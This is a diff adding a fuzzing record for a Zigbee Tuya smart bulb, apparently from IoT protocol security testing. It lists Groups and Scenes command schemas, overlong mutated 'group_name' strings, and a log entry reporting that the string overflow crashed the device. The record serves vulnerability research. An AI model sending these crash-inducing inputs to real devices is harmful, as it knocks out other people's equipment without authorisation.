@@ -1,0 +1,51 @@
+Timestamp:
+  - "20240708_22:59:12:015"
+Device:
+  - "Tuya Smart Bulb"
+IEEE:
+  - "a4:c1:38:ba:81:3f:fc:88"
+Nwk_Address:
+  - "0x4BAB"
+State:
+  - "20240708_22:59:11.json"
+Message_Relationship:
+  - "Correlation"
+Fuzzing_Messages:
+  - {
+    "groups_add_if_identifying": {
+      "id": 5,
+      "direction_header": 0,
+      "group_id": "t.Group",
+      "group_name": "t.LimitedCharString(16)"
+    },
+    "groups_add": {
+      "id": 0,
+      "direction_header": 0,
+      "group_id": "t.Group",
+      "group_name": "t.LimitedCharString(16)"
+    },
+    "scenes_enhanced_add": {
+      "id": 64,
+      "direction_header": 0,
+      "group_id": "t.Group",
+      "scene_id": "t.uint8_t",
+      "transition_time": "t.uint16_t",
+      "scene_name": "t.LimitedCharString(16)"
+    },
+    "scenes_get_scene_membership": {
+      "id": 6,
+      "direction_header": 0,
+      "group_id": "t.Group"
+    }
+  }
+Mutation_Strategy:
+  - T-1-2
+  - "groups_add"
+  - {
+      "group_name": "!@#$%^&*!@#$%^&*!@#$%^&*!@#$%^&*!@#$%^&*!@#$%^&*!@#$%^&*!@#$%^&*"
+  }
+  - {
+      "group_name": "\x7FGroup\x7FGroup\x7FGroup\x7FGroup\x7FGroup\x7FGroup\x7FGroup\x7FGroup\x7FGroup\x7FGroup\x7FGroup\x7FGroup\x7FGroup\x7FGroup\x7FGroup\x7FGroup"
+  }
+Log:
+  - "[Device 4] Exploit: AddIfIdentifying, AddGroup, EnhancedAddScene, GetSceneMembership | Mutation: Device State: [group_count: 0], AddGroup: 'group_name' String overflow | Result: Device Crashed |"
